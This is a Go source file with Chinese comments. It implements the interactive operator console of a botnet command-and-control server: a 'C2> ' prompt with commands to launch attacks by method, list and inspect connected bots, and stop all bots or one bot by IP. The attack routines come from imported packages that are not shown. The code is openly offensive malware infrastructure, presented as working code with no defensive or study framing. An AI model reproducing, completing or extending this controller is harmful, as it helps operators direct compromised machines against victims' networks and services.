package cli

import (
	"fmt"
	"os"
	"strings"
	
	"c2/attack"
	"c2/bot"
	"c2/config"
	
	"github.com/chzyer/readline"
)

// HandleUserInput 处理用户命令输入
func HandleUserInput() {
	// 创建带命令历史支持的readline实例
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          "C2> ",
		HistoryFile:     config.HistoryFile,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		fmt.Println("Failed to initialize command line:", err)
		os.Exit(1)
	}
	defer rl.Close()

	// 设置自动完成
	rl.Config.AutoComplete = setupAutoComplete()

	for {
		line, err := rl.Readline()
		if err != nil { // io.EOF, readline.ErrInterrupt
			if err == readline.ErrInterrupt {
				continue // 处理Ctrl+C
			}
			break
		}

		input := strings.TrimSpace(line)
		if input == "" {
			continue
		}

		args := strings.Fields(input)
		if len(args) == 0 {
			continue
		}

		command := strings.ToLower(args[0])

		switch command {
		case "attack":
			attack.HandleAttack(args[1:])
		case "list":
			ShowBotList()
		case "info":
			ShowBotInfo(args[1:])
		case "clear":
			ClearScreen()
			rl.SetPrompt("C2> ") // 清屏后重置提示符
		case "help":
			ShowHelp()
		case "stop":
			HandleStopCommand(args[1:])
		case "exit":
			CleanExit()
		default:
			fmt.Println("[!] Unknown command. Type 'help' to see available commands")
		}
	}
}

// setupAutoComplete 设置命令自动完成
func setupAutoComplete() *readline.PrefixCompleter {
	// 创建"attack"子命令的补全项
	attackItems := make([]readline.PrefixCompleterInterface, 0)
	for _, method := range config.GetAllMethods() {
		attackItems = append(attackItems, readline.PcItem(method))
	}
	
	// 创建主补全器
	return readline.NewPrefixCompleter(
		readline.PcItem("attack", attackItems...),
		readline.PcItem("list"),
		readline.PcItem("info"),
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("stop"),
		readline.PcItem("exit"),
	)
}

// HandleStopCommand 处理停止命令
func HandleStopCommand(args []string) {
	if len(args) == 0 {
		bot.SendStopToAllBots()
	} else {
		ip := args[0]
		bot.SendStopToSpecificBot(ip)
	}
}